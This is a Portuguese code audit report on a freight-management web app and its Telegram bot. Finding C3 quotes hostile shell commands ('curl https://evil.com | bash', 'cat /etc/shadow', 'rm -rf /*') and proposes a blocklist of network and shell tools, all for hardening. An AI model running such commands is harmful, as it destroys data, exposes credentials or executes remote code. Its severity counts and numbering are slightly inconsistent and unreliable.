# Relatório de Auditoria Completa — TMS Fretes SOMA V3
## AG03 — Suporte & Melhorias (Auditor Principal)
### Data: 2026-09-21 | Escopo: Varredura completa de todo o projeto + bot Telegram

---

## RESUMO EXECUTIVO

| Severidade | Quantidade | Status |
|---|---|---|
| **CRÍTICO** | 3 | Ação imediata necessária |
| **ALTO** | 5 | Corrigir antes de próximo deploy |
| **MÉDIO** | 7 | Melhorias recomendadas |
| **BAIXO** | 6 | Cosmético / código morto / observação |

**Total: 21 problemas identificados.**

---

## 🔴 CRÍTICO

### C1 — `handlerOntem` invocado mas não existe (bot Telegram)

- **Arquivo:** `bot/src/index.js:67` e `bot/src/handlers.js` (ausência)
- **Descrição:** `index.js` registra `bot.command('ontem', handlerOntem)` (linha 67), mas `handlerOntem` **não está definido** em `handlers.js`. A exportação lista 9 handlers; `handlerOntem` não está entre eles. O bot trava com erro não-catchado quando um usuário autorizado envia `/ontem`.
- **Impacto:** Qualquer comando `/ontem` no Telegram derruba o processamento do bot (uncaught exception no Telegraf). O bot deixa de responder a quaisquer comandos subsequentes até restart.
- **Correção:** Criar `handlerOntem` em `handlers.js` (consulta `ontem_kpis` + `ontem_contratacoes` + `ontem_cobertura` via RPC e formatada em Markdown) OU remover a linha 67 de `index.js` se a funcionalidade não for desejada.

### C2 — Token do bot vazado no log (segurança)

- **Arquivo:** `bot/src/index.js:32`
- **Descrição:** `console.log('📌 Token configurado:', botToken.substring(0, 10) + '...')` — mesmo com substring, expõe os primeiros 10 caracteres do token em logs de produção. O token do Telegram é secreto; exposição parcial ainda facilita ataques de força bruta no prefixo conhecido.
- **Impacto:** Segurança do bot comprometida; qualquer pessoa com acesso aos logs do servidor tem parte do token.
- **Correção:** Remover a linha de log do token. Mantém-se apenas `console.log('✅ Bot iniciado...')`.

### C3 — `handlerExec` executa comandos arbitrários no host (segurança)

- **Arquivo:** `bot/src/handlers.js:474–549`
- **Descrição:** `execSync(comando, { cwd: 'C:/Users/User/-tms-fretes-soma', maxBuffer: 10MB, timeout: 30s })`. A lista de comandos bloqueados (linha 495) é insuficiente:
  - `rm -rf /` só é bloqueado como substring exata — `rm -rf /*` passa (comentário a mais na lista), e variações como `rm -rf /tmp`, `chmod -R 777 /`, `cat /etc/shadow`, `curl https://evil.com | bash` não são bloqueadas.
  - A validação é case-insensitive (`comandoLower`) mas o exec é sensível ao caso em Linux (o bot executa em Windows aqui, mas se migrar para Linux, `Rm -rf` burlaria a lista).
  - **Cwd hardcoded** para `C:/Users/User/-tms-fretes-soma` — quebra se o bot roda em outra máquina ou em produção Linux.
- **Impacto:** Qualquer usuário autorizado do Telegram tem acesso de shell ao servidor, com apenas bloqueios parciais. Risco de acesso não autorizado a arquivos, execução de código, destruição de dados.
- **Correção:** 
  - Restringir `cwd` para o diretório do projeto (já é, mas confirmar que `..` não escapa).
  - Expandir lista de bloqueio para incluir: `curl`, `wget`, `nc`, `netcat`, `bash -c`, `sh -c`, `python -c`, `perl -e`, `chmod`, `chown`, `mv`, `cp`, `dd`, `> /`, `>> /`, `| bash`, `| sh`, `ssh`, `scp`.
  - Melhor: implementar whitelist de comandos permitidos em vez de blacklist.
  - Remover hardcoded do `cwd` e usar `__dirname` relativo ou variável de ambiente.

---

## 🟠 ALTO

### A1 — Página `/oportunidades` usa apenas 4 das 11 dimensões do filtro global

- **Arquivo:** `src/app/oportunidades/page.tsx:101-106` (`FiltrosOportunidades`) e `316-321` (`filterDimensions`)
- **Descrição:** A página só implementa `meses`, `transportadoras`, `regioes`, `tipos`. As 7 dimensões restantes (romaneio, esc, prazo, cidade, janela, faixaPeso, faixaCubagem) não estão implementadas — o `FilterBar` mostra 4 dropdowns, e o objeto `filtros` só tem esses 4. O comentário em `FinanceiroPage` (linha 154-156 do page.tsx) confirma isso como pendente: "*a página filtra por data_contratacao, não v_cotacao_filtros.mes*".
- **Impacto:** Oportunidades tem filtro incompleto vs. todas as outras páginas (Financeiro, Operacao, Transportadoras, Dados têm 11/11). O usuário não pode filtrar por prazo, cidade, cliente tipo, etc. na página de oportunidades.
- **Correção:** Estender `FiltrosOportunidades` e `filterDimensions` para 11 dimensões. Como a página filtra client-side sobre `data_contratacao` (não `v_cotacao_filtros.mes`), a semântica de "mês" precisa ser decidida primeiro (ver pendente em PENDENTES.md e comentário em FinanceiroPage).

### A2 — `handlerFrete` usa RPC errado para simulação de custo

- **Arquivo:** `bot/src/handlers.js:285`
- **Descrição:** O `handlerFrete` (simulação de frete para X kg) chama `transportadoras_comparativo` com todos os parâmetros null — que retorna a comparação geral de transportadoras (qtd cotada, frete médio, % mais barata). Isso NÃO é uma simulação de custo por peso. O resultado é usado para calcular `freteMedio * (peso / 100)` (linha 304), que é uma estimativa linear por kg, não uma simulação real.
- **Impacto:** O comando `/frete 100` do bot não entrega a funcionalidade prometida ("simulação de custo"). O cálculo é uma aproximação rudimentar que ignora cubagem, prazo, região — variáveis que afetam preço real.
- **Correção:** Usar `financeiro_simulacao_custo` com `p_transportadoras: [transportadora]` para uma simulação real, ou documentar que o bot só entrega estimativa por kg (mudar texto de ajuda).

### A3 — `TRANSP_ORDER` do bot/contratadas inclui transportadora inexistente no banco

- **Arquivo:** `src/app/oportunidades/page.tsx:41-50`
- **Descrição:** O array `TRANSP_ORDER` da página de oportunidades lista 8 transportadoras, incluindo `"B. Transportes"` (linha 49). O banco tem apenas 7 transportadoras (`CARRIER_COLOR` em operacao/transportadoras page.tsx não a inclui). Se `"B. Transportes"` nunca aparecer em resultado, o dropdown mostra uma opção inválida.
- **Impacto:** Oportunidades mostra opção de filtro inalcançável; se futuramente alguém filtrar por ela, retorna zero resultados sem explicação.
- **Correção:** Remover `"B. Transportes"` de `TRANSP_ORDER` de oportunidades, ou confirmar se ela existe em alguma base de dado futura e justifica manter.

### A4 — Migration `comparacoes` contém bug de acento não corrigido neste arquivo

- **Arquivo:** `supabase/migrations/2026091303_create_comparacoes_view.sql:157`
- **Descrição:** O CTE `grupo_percentis` (linha 157) usa `tipo_cliente IN ('Público', 'Privado')` COM acento em "Público". O banco armazena `tipo_cliente = 'Publico'` SEM acento (confirmado em PENDENTES.md: "*a coluna clientes.tipo_cliente armazena 'Publico' (SEM acento)"). A correção desta específica estava documentada em `fix_comparacoes_classif_acento_publico`, mas este arquivo de migration consolidado ainda reflete o estado ANTES da correção.
- **Impacto:** Se esta migration for aplicada em um banco limpo, TODOS os clientes "Publico" (219 processos) classificam como 'alerta' em vez de usar os percentis do próprio grupo — exatamente o bug que já foi corrigido no banco atual.
- **Correção:** Alterar linha 157 para `tipo_cliente IN ('Publico', 'Privado')` — sem acento. Este arquivo deve refletir o estado FINAL do banco, não o intermediário.

### A5 — Oportunidades não aplica filtro na consulta de RPC — só "decorativo"

- **Arquivo:** `src/app/oportunidades/page.tsx:140-183` (`fetchComparacoes`)
- **Descrição:** A página busca 5.194 linhas da view `comparacoes` SEM filtro, depois filtra client-side em JS (linha 183: `allRows.filter(row => passaFiltros(...))`. Isso funciona para as 4 dimensões atuais, mas:
  - Opcional: o `FilterBar` mostra as opções de dropdown derivadas do resultado JÁ FILTRADO (correto, cascata implementada em JS), mas a consulta total sempre busca 100% da base.
  - Com 11 dimensões, o filtro client-side em 5.194 linhas continua viável, mas não escala se a base crescer significativamente.
- **Impacto:** Página funciona, mas é ineficiente para bases grandes — busca 5.194 linhas sempre, mesmo se o filtro reduzir para 50.
- **Correção:** Quando as 11 dimensões forem implementadas, filtrar no banco (via RPC com parâmetros) em vez de client-side, igual às outras páginas.

### A6 — loading.tsx genérico — não diferencia spinner de navegação vs. filtro

- **Arquivo:** `src/app/loading.tsx`
- **Descrição:** O `loading.tsx` único cobre todas as rotas, mas não há distinção entre: (1) navegação entre páginas, (2) mudança de filtro (FilterBar), (3) carregamento de modal. O texto fixo "Carregando…" é genérico demais para contextos diferentes.
- **Impacto:** UX — o usuário não sabe se está navegando, filtrando ou carregando detalhe. Pequeno, mas perceptível.
- **Correção:** Opicional — usar `useSearchParams()` em um `loading.tsx` client-side para mostrar contexto ("Filtrando..." vs. "Carregando página...").

### A7 — `VisaoGeralCard` fetcha RPC com todos os parâmetros inclusive quando não precisa

- **Arquivo:** `src/components/VisaoGeralCard.tsx:73-78`
- **Descrição:** Ao abrir o modal, chama `visao_geral_clientes_minimo` com `p_mes`, `p_transportadora_id`, `p_janela`, `p_dia` — mas `p_dia` pode ser `null` (quando não há dia selecionado na home). A RPC provavelmente trata `null`, mas enviar parâmetro nulo desnecessariamente aumenta inchada da chamada.
- **Impacto:** Baixo — RPC provavelmente trata null corretamente. Mas código mais limpo removeria parâmetros null.
- **Correção:** Condicionar `p_dia` ao valor existente: `p_dia: data.dia ?? null` ou remover se a RPC aceita chamada sem o parâmetro.

---

## 🟡 MÉDIO

### M1 — Duplicação de código de leitura de CSS variables em todos os gráficos Chart.js

- **Arquivo:** `CotadoContratadoCharts.tsx`, `PadroesCharts.tsx`, `PesoCustoCharts.tsx`, `ComparativoCharts.tsx`, `ClientesChart.tsx`, `RegiaoComercialChart.tsx`, `PrecoPrazoChart.tsx`, `ClassificacaoChart.tsx`, `OntemTendenciaChart.tsx`
- **Descrição:** Cada componente de gráfico duplica a lógica `readVars()` / `useThemeVars()` com seus próprios `VAR_NAMES` e `FALLBACK`. São ~9 componentes com a mesma lógica repetida (~20 linhas cada).
- **Impacto:** Manutenção — alterar a forma de ler variáveis CSS ex exige editar 9 arquivos. Risco de inconsistência futura.
- **Correção:** Extrair `useThemeVars` para um hook compartilhado em `src/hooks/useThemeVars.ts` (ou `src/lib/theme.ts`), importado por todos os gráficos.

### M2 — Handler `handlerExec` sem rate limiting (bot)

- **Arquivo:** `bot/src/handlers.js:474`
- **Descrição:** Qualquer usuário autorizado pode enviar quantos `/exec` quiser, sem limite de frequência. Com `timeout: 30s` e `maxBuffer: 10MB`, um usuário malicioso pode drenar recursos do servidor (CPU, memória, I/O) enviando comandos pesados em sequência.
- **Impacto:** DDoS interno possível. Se o bot tem vários usuários autorizados (futuro), o risco aumenta.
- **Correção:** Implementar rate limiting simples: `Map<chatId, { lastExec: number, count: number }>` com janela de e.g. 1 exec a cada 30s ou 5 execs por minuto.

### M3 — `SessionIndicator` executa `createSupabaseBrowserClient()` em useEffect sem tratamento de erro

- **Arquivo:** `src/components/SessionIndicator.tsx:21-36`
- **Descrição:** O `useEffect` chama `createSupabaseBrowserClient()` (que pode throw se as env vars não existirem em runtime — mesmo com o fix de D-29, o throw acontece no browser do usuário, não no build). O throw dentro do `then()` do `getSession()` não é catchado — se `createSupabaseBrowserClient()` falhar, o erro quebra o efeito e o estado `email` fica `undefined` para sempre.
- **Impacto:** Se as env vars não estão configuradas no ambiente de produção, o `SessionIndicator` para de funcionar (fica "carregando" indefinidamente ou erro silencioso).
- **Correção:** Wraps `createSupabaseBrowserClient()` em try/catch dentro do useEffect, setando `email = null` em caso de erro.

### M4 — `ImportarClient` não valida conteúdo dos arquivos antes de importar

- **Arquivo:** `src/app/importar/ImportarClient.tsx:99-117` (`analisar`) e `119-154` (`confirmar`)
- **Descrição:** A fase "analisando" apenas faz parse JSON e chama `buildImportRows` — não valida se os dados são coerentes (ex: cotacoes sem transportadoras, contratados sem CNPJs, cnpj_to_info vazio). Se o arquivo estiver corrompido ou em formato inesperado, o erro só aparece na importação em si (fase "importando").
- **Impacto:** O Mikael pode confirmar uma importação que vai falhar na metade — os dados são truncados e recarregados parcialmente antes do erro.
- **Correção:** Adicionar validações básicas na fase "analisando": `cotacoes.length > 0`, `contratados.length > 0`, `cnpjInfo` tem entries. Mostrar erro claro antes de permitir "Confirmar".

### M5 — `proxy.ts` não verificado — arquivo renomeado, presença não confirmada

- **Arquivo:** mencionedo em `LOG_DECISOES.md` (D-27, D-28) e `PENDENTES.md`, mas não listado no `find` daraiz do projeto
- **Descrição:** O `src/proxy.ts` (antigo `middleware.ts`) é a camada de auth via Vercel middleware. Ele é mencionado extensivamente no código e documentação, mas não foi encontrado na lista de arquivos do diretório `src/` (apenas `src/proxy.ts` foi listado no diff entre as duas cópias). Verificar se ele existe na raiz do src ou se foi movido.
- **Impacto:** Se o arquivo não existir, a auth por middleware não funciona — as páginas dependem apenas de `requireUser()` (que é a rede de segurança documentada em D-28). Neste caso, a proteção ainda existe via requireUser(), mas sem o redirect automático do middleware para visitantes não logados.
- **Correção:** Confirmar presença de `src/proxy.ts` ou `middleware.ts` na raiz do src.

### M6 — Bot não tem health check/monitoramento

- **Arquivo:** `bot/src/index.js` (inicialização)
- **Descrição:** O bot inicia e logs "iniciado", mas não há: heartbeat para monitoramento externo, graphs/métricas de uso, replay de comandos falhos para análise posterior, persistência de erro em arquivo/dispositivo.
- **Impacto:** Se o bot cai (crash, OOM, network), só o log do processo indica o problema — não há alerta automático.
- **Correção:** Adicionar `console.error` de todos os erros do `bot.catch` para um logging mais detalhado; considerar health endpoint se bot roda como service.

### M7 — gráfico `ClassificacaoChart` e `CotadoContratadoCharts` potencial hydroponic SSR

- **Arquivo:** `src/app/oportunidades/OportunidadesTabsClient.tsx` e `src/app/financeiro/CotadoContratadoCharts.tsx`
- **Descrição:** Ambos são Client Components que usam `useEffect` para ler variáveis CSS. O `ClassificacaoChart` é importado dentro de `OportunidadesTabsClient` que é um Client Component — se `OportunidadesTabsClient` não estiver dentro de `<Suspense>`, o gráfico pode causar hidratação mismatch.
- **Impacto:** Possível warning de hidratação ou renderização incorreta no primeiro load.
- **Correção:** Confirmar que `OportunidadesTabsClient` está envolvido em `<Suspense>` no `page.tsx` de oportunidades, ou adicionar `suppressHydrationWarning` no container.

---

## 🟢 BAIXO

### B1 — Commentário desatualizado no `DashboardShell.tsx` sobre "Oportunidades desabilitada"

- **Arquivo:** `src/components/DashboardShell.tsx:16-19`
- **Descrição:** O comentário diz "*nenhum item de NAV_ITEMS abaixo seta disabled: true hoje — a nota antiga aqui ('aparece desabilitada, em breve', referenciando ISSUE-23) ficou desatualizada*". O comentário em si já diz que está desatualizado, mas poderia ser removido para limpeza.
- **Impacto:** Confusão para leitores do código.
- **Correção:** Remover ou atualizar o comentário para refletir estado atual.

### B2 — `format.tsx` exporta `fmtKg` mas nunca é usada fora de `dados/page.tsx`

- **Arquivo:** `src/lib/format.tsx:70-73`
- **Descrição:** `fmtKg` é definida e exportada, usada apenas em `dados/page.tsx`. Se não houver uso futuro planejado, é dead code leve.
- **Impacto:** Nenhum — código funcional, apenas não usado fora de um lugar.
- **Correção:** Manter (uso futuro possível) ou mover para `dados/page.tsx` se não houver uso cross-página planejado.

### B3 — `Proxy.ts` — chaves de ambiente a vérificar na Vercel

- **Arquivo:** `.env.local.example` (implícito) e `src/lib/supabase-browser.ts`
- **Descrição:** O D-29 corrigiu o build quebrado por env vars faltando, mas as vars `NEXT_PUBLIC_SUPABASE_URL` e `NEXT_PUBLIC_SUPABASE_ANON_KEY` ainda precisam ser configuradas na Vercel em Production/Preview/Development. Se não estiverem, o app funciona no build mas dá erro em runtime no navegador.
- **Impacto:** Deployment funcional mas app quebra para usuários se env vars não configuradas.
- **Correção:** Verificar nas Environment Variables da Vercel ("tms-fretes-soma-app") que ambas estão presentes nos 3 ambientes.

### B4 — `src/lib/supabase.ts` deletado mas referência em comentário

- **Arquivo:** referido em `supabase-browser.ts:26` e `LOG_DECISOES.md:D-29`
- **Descrição:** O arquivo `src/lib/supabase.ts` (antigo cliente sem cookie) foi deletado conforme D-29. Se algum código residual ainda o importar, quebraria. Conferência: `grep -r "from.*supabase"` mostra apenas `supabase-server.ts` e `supabase-browser.ts` como imports ativos — ok.
- **Impacto:** Nenhum se confirmado — o grep mostra que não há imports órfãos.
- **Correção:** Nenhuma — confirmado limpo.

### B5 — `next.config.ts` tem outputFileTracingIncludes que pode ser desnecessário após upgrade do Next

- **Arquivo:** `next.config.ts:20-22`
- **Descrição:** A correção de D-27 adicionou `outputFileTracingIncludes` para incluir `@swc/helpers/esm/**`. Se o bug da Vercel for corrigido em versão futura do Next.js/Vercel, essa configuração extra deixa de ser necessária (e potencialmente aumenta slightly o tamanho do deployment).
- **Impacto:** Baixo — apenas tamanho de deployment ligeiramente maior.
- **Correção:** Monitorar releases do Next.js/Vercel; remover quando o bug #93852 for corrigido oficialmente.

### B6 — Variável `maxMes` em `FinanceiroPage` pode ser null e causar filtro vazio no gráfico de economia

- **Arquivo:** `src/app/financeiro/page.tsx:728`
- **Descrição:** O gráfico de economia mensal filtra com `(maxMes != null && r.mes < maxMes)` — se `maxMes` for null (base vazia), a condição é sempre falsa, e apenas linhas com `diffPosSum > 0` aparecem. Funciona, mas o comportamento não é documentado.
- **Impacto:** Nenhum — funciona corretamente, apenas comportamento implicitamente documentado.
- **Correção:** Comentário explicando o comportamento quando `maxMes == null`.

---

## CRUZAMENTO COM PENDENTES.MD

| # | Pendente (PENDENTES.md) | Status auditado | Observação |
|---|---|---|---|
| 1 | `/usuarios` — Gestão de Usuários (não implementado) | ✅ Confirmado — não existe código | Pendente planejado, não é bug |
| 2 | Faixa de peso corrigida (DEC-26) | ✅ Corrigido e documentado | Migration `fix_faixa_peso_alinha_com_dec26` aplicada |
| 3 | Issue #1 — "Possible exposed API Key" (falso alarme) | ✅ Investigado e fechado | Anon key é pública por design |
| 4 | 500 em /operacao (timeout DB) | ✅ Corrigido (D-26) | `operacao_dashboard_estatico` reduziu recomputos |
| 5 | `/oportunidades` quebrada em produção | ✅ Corrigido | `comparacoes` view reconstruída |
| 6 | Filtro Global — 11/11 dimensões | ⚠️ Parcial: /oportunidades só tem 4/11 | Ver A1 acima |
| 7 | Cascata de opções | ✅ Implementada | `financeiro_filtro_opcoes_cascata` reaproveitada |
| 8 | `/dados` com filtro global | ✅ Implementado (2026-09-16) | 11 dimensões, paginação, busca |
| 9 | `/ontem` — seletor de dia | ✅ Implementado (2026-09-16) | `DiaSelector` + `ontem_dias_disponiveis` |
| 10 | Simulação de Custo | ✅ Implementado | `financeiro_simulacao_custo` |
| 11 | Importação de arquivos | ✅ Implementado | `/importar` com `requireAdmin()` |
| 12 | Auth e segurança | ✅ Resolvido | `requireUser`/`requireAdmin` + RLS authenticated-only |
| 13 | chartClassif bug de acento | ✅ Corrigido | `fix_comparacoes_classif_acento_publico` |
| 14 | KPIs /operacao universo errado | ✅ Corrigido | `fix_operacao_kpis_toda_base_nao_so_cruzadas` |
| 15 | Feedback visual de carregamento | ✅ Corrigido | `loading.tsx` adicionado |
| 16 | **/oportunidades com só 4 das 11 dimensões** | ⚠️ **Ainda pendente** | Ver A1 — é a única página com filtro incompleto |

---

## CRUZAMENTO COM LOG_DECISOES.MD

| Decisão | Status | Observação da auditoria |
|---|---|---|
| D-27 (bug Vercel/Next.js 16) | ✅ Aplicado | `next.config.ts` com `outputFileTracingIncludes` |
| D-28 (requireUser redundante ao proxy) | ✅ Aplicado | Todas as páginas protegidas chamam `requireUser()` |
| D-29 (env var no escopo do módulo) | ✅ Corrigido | `supabase-browser.ts` adiou checagem para runtime |
| D-30 (format como função cross-boundary) | ✅ Corrigido | FilterBar usa `FORMATTERS` com chaves string |
| D-31 (faixa de peso DEC-26) | ✅ Aplicado | `v_cotacao_filtros` com 6 cortes corretos |
| D-32 (D1 Oportunidade objetiva) | ✅ Implementado | `radar_d2` com `prazo_barata` |
| D-33 (D5 Frete mínimo) | ✅ Implementado | `radar_d5` com `frete_minimo_observado` |

---

## COMPARATIVO: `-tms-fretes-soma/` vs `Projetos/tms-fretes-soma/`

O diretório `Projetos/tms-fretes-soma/` é uma CÓPIA ANTIGA e incompleta do projeto:

- **`src/app/dados/page.tsx`** — versão antiga SEM filtro global (sem `FilterBar`, sem `FiltrosDados`, sem `filtroArgsOf`, sem `financeiro_filtro_opcoes_cascata`). A versão `-tms-fretes-soma/` é a mais recente e correta (commit `ae8d0c4`, 2026-09-16).
- **`src/app/login/LoginForm.tsx`** — existe em `-tms-fretes-soma/` mas NÃO existe em `Projetos/`.
- **`src/app/importar/`** — existe em `-tms-fretes-soma/` mas NÃO existe em `Projetos/`.
- **`src/app/financeiro/`** — páginas e subcomponentes (`CotadoContratadoCharts`, `PadroesCharts`, `PesoCustoCharts`, `FinanceiroTabs`) existem em `-tms-fretes-soma/` mas NÃO em `Projetos/`.
- **`src/app/oportunidades/`** — existe em `-tms-fretes-soma/` mas NÃO em `Projetos/`.
- **`src/components/`** — Vários componentes faltando em `Projetos/` (`FilterBar`, `DiaSelector`, `VisaoGeralCard`, `OntemTendenciaChart`, `ClassificacaoChart`, `SidebarStats`, `SessionIndicator`, `ThemeToggle`).
- **`supabase/migrations/`** — `Projetos/` tem uma migration extra (`2026091401_fix_comparacoes_view_schema_real.sql`) que `-tms-fretes-soma/` não tem.

**Conclusão:** `Projetos/tms-fretes-soma/` é um snapshot ANTES das últimas mudanças (pre-2026-09-16, possivelmente). O diretório de trabalho correto é `-tms-fretes-soma/`. NENHUMA alteração deve ser feita em `Projetos/`.

---

## RECOMENDAÇÕES PRIORITÁRIAS (ordem de ação)

1. **[CRÍTICO] Criar `handlerOntem` ou remover registro de `/ontem` do bot** — o bot trava com uncaught exception quando recebe o comando.
2. **[CRÍTICO] Remover log do botToken** em `bot/src/index.js:32`.
3. **[CRÍTICO] Hardening do `handlerExec`** — expanded blacklist + remover `cwd` hardcoded + considerar whitelist.
4. **[ALTO] Estender `/oportunidades` para 11 dimensões do filtro** — única página com filtro incompleto.
5. **[ALTO] Corrigir `handlerFrete`** para usar `financeiro_simulacao_custo` ou documentar que é estimativa.
6. **[ALTO] Corrigir migration `comparacoes`** (arquivo consolidado) — remover acento de 'Público'.
7. **[ALTO] Remover `"B. Transportes"` de TRANSP_ORDER de oportunidades** (inexistente no banco).
8. **[MÉDIO] Extrair `useThemeVars` para hook compartilhado** — eliminar duplicação em 9 componentes.
8. **[MÉDIO] Adicionar rate limiting ao `handlerExec`** do bot.
9. **[MÉDIO] Wraps `createSupabaseBrowserClient()` em try/catch no `SessionIndicator`**.
10. **[MÉDIO] Validar conteúdo dos arquivos antes de permitir "Confirmar" na importação**.
